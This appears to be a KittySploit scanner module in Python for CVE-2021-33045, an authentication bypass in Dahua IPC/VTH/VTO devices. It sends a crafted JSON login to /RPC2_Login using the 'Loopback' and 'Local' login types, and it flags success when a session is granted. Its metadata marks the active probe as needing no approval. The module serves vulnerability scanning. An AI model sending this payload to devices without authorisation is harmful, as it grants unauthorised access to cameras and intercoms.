#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The identity authentication bypass vulnerability found in some Dahua products during the login process."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Dahua IPC/VTH/VTO - Authentication Bypass Detection',
        'description': 'The identity authentication bypass vulnerability found in some Dahua products during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'dahua', 'auth-bypass', 'seclists', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2021/Oct/13',
            'https://www.dahuasecurity.com/aboutUs/trustedCenter/details/582',
        ],
        'cve': 'CVE-2021-33045',
    }

    def run(self):
        path = '/RPC2_Login'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n  "method": "global.login",\n  "params": {\n    "userName": "admin",\n    "ipAddr": "127.0.0.1",\n    "loginType": "Loopback",\n    "clientType": "Local",\n    "authorityType": "Default",\n    "passwordType": "Plain",\n    "password": "admin"\n  },\n  "id": 1,\n  "session": 0\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"session":', '"result":true', '"keepAliveInterval":',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Dahua IPC/VTH/VTO - Authentication Bypass detected', path=path)
            return True
        return False

